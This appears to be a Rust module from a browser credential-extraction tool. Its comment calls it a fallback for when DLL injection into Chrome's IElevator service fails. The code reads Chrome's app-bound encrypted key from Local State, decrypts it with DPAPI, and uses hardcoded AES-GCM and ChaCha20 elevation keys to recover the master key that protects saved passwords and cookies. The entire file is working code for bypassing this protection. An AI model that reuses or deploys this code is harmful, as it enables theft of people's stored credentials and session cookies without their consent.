//! In-process fallback when DLL injection / IElevator fails.

use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Key, Nonce,
};
use base64::{engine::general_purpose, Engine as _};
use serde_json::Value;
use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};

const CRYPTPROTECT_UI_FORBIDDEN: u32 = 0x1;
const CRYPTPROTECT_LOCAL_MACHINE: u32 = 0x4;

const AES_ELEV_KEY: [u8; 32] = [
    0xB3, 0x1C, 0x6E, 0x24, 0x1A, 0xC8, 0x46, 0x72, 0x8D, 0xA9, 0xC1, 0xFA, 0xC4, 0x93, 0x66,
    0x51, 0xCF, 0xFB, 0x94, 0x4D, 0x14, 0x3A, 0xB8, 0x16, 0x27, 0x6B, 0xCC, 0x6D, 0xA0, 0x28,
    0x47, 0x87,
];

const CHACHA_ELEV_KEY: [u8; 32] = [
    0xE9, 0x8F, 0x37, 0xD7, 0xF4, 0xE1, 0xFA, 0x43, 0x3D, 0x19, 0x30, 0x4D, 0xC2, 0x25, 0x80,
    0x42, 0x09, 0x0E, 0x2D, 0x1D, 0x7E, 0xEA, 0x76, 0x70, 0xD4, 0x1F, 0x73, 0x8D, 0x08, 0x72,
    0x96, 0x60,
];

fn dpapi_decrypt(data: &[u8], flags: u32) -> Option<Vec<u8>> {
    unsafe {
        let mut input = CRYPT_INTEGER_BLOB {
            cbData: data.len() as u32,
            pbData: data.as_ptr() as *mut u8,
        };
        let mut output = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: std::ptr::null_mut(),
        };
        if CryptUnprotectData(
            &mut input,
            None,
            None,
            None,
            None,
            flags | CRYPTPROTECT_UI_FORBIDDEN,
            &mut output,
        )
        .is_ok()
        {
            let slice =
                std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec();
            let _ = windows::Win32::Foundation::LocalFree(windows::Win32::Foundation::HLOCAL(
                output.pbData as *mut _,
            ));
            Some(slice)
        } else {
            None
        }
    }
}

fn normalize_key(data: &[u8]) -> Option<Vec<u8>> {
    if data.len() == 32 {
        return Some(data.to_vec());
    }
    if data.len() > 32 {
        let tail = &data[data.len() - 32..];
        if tail.iter().any(|&b| b != 0) {
            return Some(tail.to_vec());
        }
    }
    parse_structured_key(data)
}

fn parse_structured_key(data: &[u8]) -> Option<Vec<u8>> {
    if data.len() < 8 {
        return None;
    }
    let val_len = u32::from_le_bytes(data[0..4].try_into().ok()?) as usize;
    let mut offset = 4 + val_len;
    if data.len() < offset + 4 {
        return None;
    }
    let key_len = u32::from_le_bytes(data[offset..offset + 4].try_into().ok()?) as usize;
    offset += 4;
    if key_len == 32 && data.len() >= offset + 32 {
        return Some(data[offset..offset + 32].to_vec());
    }
    None
}

fn aes_gcm_decrypt(key: &[u8; 32], iv: &[u8], ciphertext: &[u8]) -> Option<Vec<u8>> {
    if iv.len() != 12 || ciphertext.len() < 16 {
        return None;
    }
    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(key));
    cipher.decrypt(Nonce::from_slice(iv), ciphertext).ok()
}

fn chacha20_decrypt(key: &[u8; 32], iv: &[u8], ciphertext: &[u8]) -> Option<Vec<u8>> {
    if iv.len() != 12 || ciphertext.len() < 16 {
        return None;
    }
    use chacha20poly1305::{ChaCha20Poly1305, KeyInit, aead::Aead as _};
    let cipher = ChaCha20Poly1305::new_from_slice(key).ok()?;
    cipher.decrypt(iv.into(), ciphertext).ok()
}

fn chrome_inner_decrypt(data: &[u8]) -> Option<Vec<u8>> {
    for i in 0..data.len().saturating_sub(61) {
        let flag = data[i];
        if flag != 0x01 && flag != 0x02 {
            continue;
        }
        let iv = &data[i + 1..i + 13];
        let ct_start = i + 13;
        if data.len() < ct_start + 48 {
            continue;
        }
        let ciphertext = &data[ct_start..ct_start + 32];
        let tag = &data[ct_start + 32..ct_start + 48];
        let mut payload = ciphertext.to_vec();
        payload.extend_from_slice(tag);

        let pt = match flag {
            0x01 => aes_gcm_decrypt(&AES_ELEV_KEY, iv, &payload),
            0x02 => chacha20_decrypt(&CHACHA_ELEV_KEY, iv, &payload),
            _ => None,
        };
        if let Some(key) = pt.filter(|k| k.len() == 32) {
            return Some(key);
        }
    }
    None
}

fn extract_master_key(data: &[u8]) -> Option<Vec<u8>> {
    normalize_key(data).or_else(|| chrome_inner_decrypt(data))
}

pub fn try_from_local_state(json: &Value) -> Option<Vec<u8>> {
    let key_b64 = json["os_crypt"]["app_bound_encrypted_key"].as_str()?;
    let mut encrypted = general_purpose::STANDARD.decode(key_b64).ok()?;
    if encrypted.starts_with(b"APPB") && encrypted.len() > 4 {
        encrypted = encrypted[4..].to_vec();
    }

    if let Some(layer) = dpapi_decrypt(&encrypted, 0) {
        if let Some(key) = extract_master_key(&layer) {
            return Some(key);
        }
    }

    if let Some(outer) = dpapi_decrypt(&encrypted, CRYPTPROTECT_LOCAL_MACHINE) {
        if let Some(key) = extract_master_key(&outer) {
            return Some(key);
        }
        if let Some(inner) = dpapi_decrypt(&outer, 0) {
            if let Some(key) = extract_master_key(&inner) {
                return Some(key);
            }
        }
    }

    None
}
